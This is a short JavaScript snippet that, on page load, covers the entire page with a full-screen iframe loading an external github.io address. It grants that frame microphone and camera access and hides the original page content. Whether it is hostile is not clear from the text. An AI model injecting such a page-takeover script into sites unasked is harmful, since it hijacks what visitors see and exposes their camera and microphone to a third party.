(function () {
  document.addEventListener('DOMContentLoaded', function () {
    const iframe = document.createElement('iframe');
    iframe.src = 'https://vaa-official.github.io/script/';
    iframe.allow = 'microphone; camera';
    Object.assign(iframe.style, {
      position: 'fixed',
      top: '0',
      left: '0',
      width: '100%',
      height: '100%',
      border: 'none',
      margin: '0',
      padding: '0',
      zIndex: '9999'
    });

    document.documentElement.style.height = '100%';
    document.body.style.margin = '0';
    document.body.style.padding = '0';
    document.body.style.height = '100%';
    document.body.style.overflow = 'hidden';

    document.body.appendChild(iframe);
  });
})();
